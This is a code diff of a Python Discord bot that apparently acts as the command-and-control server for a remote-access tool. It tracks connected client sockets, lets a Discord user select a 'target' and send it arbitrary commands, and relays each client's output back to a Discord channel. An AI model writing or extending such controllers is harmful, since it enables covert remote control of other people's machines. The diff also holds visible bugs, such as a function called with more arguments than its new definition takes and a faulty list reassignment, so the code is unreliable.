@@ -8,71 +8,95 @@ import discord
 from discord.ext import commands
 import asyncio
 import os
+import uuid
 
 clients = []
 target_client = None
+response_queue = asyncio.Queue()
 
 bot_instance = None
 
-async def handle_client_commands(client_socket, address):
+async def handle_client_commands(client_socket, client_id):
     while True:
         data = client_socket.recv(1024)
         if not data:
-            print(f"Connection from {address} closed.")
-            clients.remove(client_socket)
+            print(f"Connection from {client_id} closed")
+            clients = [client for client in clients if client[0] != client_id]
             break
-
+        
         command = data.decode()
-        print(f"Received command from {address}: {command}")
 
         try:
-            response = await execute_command_on_client(client_socket, command)  # Await the result from the client
-            await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the response to Discord
+            response = await execute_command_on_client(client_socket, command)
+            await relay_response_to_discord(response, client_socket)
         except Exception as e:
             response = f"Error executing command: {str(e)}"
-            await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the error response to Discord
+            await relay_response_to_discord(response, client_socket)
 
     client_socket.close()
 
-def handle_client(client_socket, address):
-    print(f"Accepted connection from {address}")
-    clients.append(client_socket)
-    client_socket.send(b"Welcome to the server!")
-
-    async def handle_client_commands(client_socket, address):
-        while True:
-            data = client_socket.recv(1024)
-            if not data:
-                print(f"Connection from {address} closed.")
-                clients.remove(client_socket)
-                break
-
-            command = data.decode()
-            print(f"Received command from {address}: {command}")
-
-            try:
-                response = await execute_command_on_client(client_socket, command)  # Await the result from the client
-                await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the response to Discord
-            except Exception as e:
-                response = f"Error executing command: {str(e)}"
-                await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the error response to Discord
-
-    # Create an event loop for the handle_client_commands function
-    loop = asyncio.new_event_loop()
-
-    # Start the handle_client_commands coroutine in a separate thread
-    asyncio.run_coroutine_threadsafe(handle_client_commands(client_socket, address), loop)
-
-def send_command_to_clients(command):
-    for client_socket in clients:
+async def relay_responses():
+    while True:
+        response, client_socket = await response_queue.get()
         try:
-            client_socket.send(command.encode())
-        except:
-            clients.remove(client_socket)
+            await relay_response_to_discord(response, client_socket)
+        except Exception as e:
+            print(f"Error relaying response to Discord: {str(e)}")
+
+async def execute_command_on_target(command):
+    global target_client
+    if target_client is not None:
+        try:
+            response = await execute_command_on_client(target_client[1], command)
+            return response
+        except Exception as e:
+            response = f"Error executing command: {str(e)}"
+            return response
+    else:
+        return "No target client selected"
+
+def handle_client(client_socket, address):
+    client_id = str(uuid.uuid4())
+    print(f"Accepted connection from {address} with ID: {client_id}")
+    clients.append([client_id, client_socket, None])
+    client_socket.send(f"Welcome {client_id}".encode())
+
+    loop = asyncio.new_event_loop()
+    asyncio.run_coroutine_threadsafe(handle_client_commands(client_socket, client_id), loop)
+
+async def execute_command_on_client(client_socket, command):
+    client_socket.send(command.encode())
+    response = client_socket.recv(4096).decode()
+    return response
+
+async def relay_response_to_discord(response):
+    #print(f"Response from client: {response}")
+    global bot_instance, target_client
+    if bot_instance is not None and response is not None and response.strip():
+        if target_client is not None and target_client[2] is not None:
+            channel = bot_instance.get_channel(target_client[2])
+        # Find the corresponding Discord channel using the client_socket
+            if channel:
+                await channel.send(response)
+            else:
+                print("Channel not found.")
+        else:
+            print("Discord Channel ID not set for the client.")
+    else:
+        print("Bot instance not available or response is empty")
+
+def close_server(signal, frame):
+    global clients
+    print("\nClosing server and terminating all connections...")
+    for client_info in clients:
+        client_socket = client_info[1]
+        client_socket.close()
+    sys.exit(0)
 
 def list_active_connections():
-    connections = [f"{i}: {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}" for i, client_socket in enumerate(clients)]
+    connections = [f"{i}: {client[1].getpeername()[0]}:{client[1].getpeername()[1]}" for i, client in enumerate(clients)]
     return '\n'.join(connections)
+
 
 def switch_target_client(index):
     global target_client
@@ -81,51 +105,6 @@ def switch_target_client(index):
         return f"Switched target client to {index}"
     else:
         return "Invalid client index"
-
-async def execute_command_on_target(command):
-    if target_client is not None:
-        try:
-            response = await execute_command_on_client(target_client, command)  # Await the result from the client
-            #await relay_response_to_discord(response, target_client)  # Pass target_client to relay the response to Discord
-        except Exception as e:
-            response = f"Error executing command: {str(e)}"
-            #await relay_response_to_discord(response, target_client)  # Pass target_client to relay the error response to Discord
-    #else:
-        #response = "No target client selected"
-    await relay_response_to_discord(response, target_client)
-
-
-async def execute_command_on_client(client_socket, command):
-    client_socket.send(command.encode())
-    response = client_socket.recv(4096).decode()
-    print(response)
-    return response
-
-async def relay_response_to_discord(response, client_socket):
-    print(f"Response from client: {response}")
-    global bot_instance
-    if bot_instance is not None and response:
-        channel_id = client_socket.getpeername()[1]  # Use the port number as the channel ID (unique identifier)
-
-        channel = bot_instance.get_channel(channel_id)
-        if channel:
-            await channel.send(response)  # Send the response from the client to Discord
-        else:
-            print("Channel not found.")
-    else:
-        print("Bot instance not available or response is empty")
-
-def close_server(signal, frame):
-    global clients
-    print("\nClosing server and terminating all connections...")
-    for client_socket in clients:
-        client_socket.close()
-    sys.exit(0)
-
-async def relay_responses():
-    while True:
-        response, client_socket = await response_queue.get()  # Wait for responses in the queue
-        await relay_response_to_discord(response, client_socket)
 
 def main():
     host = "127.0.0.1"  # Change this to your server's IP address
@@ -169,13 +148,22 @@ def main():
 
     @bot.command(name='target')
     async def set_target(ctx, index: int):
-        response = switch_target_client(index)
+        global target_client
+        if 0 <= index < len(clients):
+            clients[index][2] = ctx.channel.id
+            target_client = clients[index]
+            response = f"Switched target client to {index}"
+        else:
+            response = "Invalid client index"
         await ctx.send(response)
 
     @bot.command(name='execute')
     async def execute_command(ctx, *, command: str):
-        response = await execute_command_on_target(command)
-        await ctx.send(response)
+        try:
+            response = await execute_command_on_target(command)
+        except Exception as e:
+            response = f"Error executing command: {str(e)}"
+        await relay_response_to_discord(response)
 
     @bot.command(name='h')  # Changed help to h
     async def help_commands(ctx):
@@ -197,4 +185,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
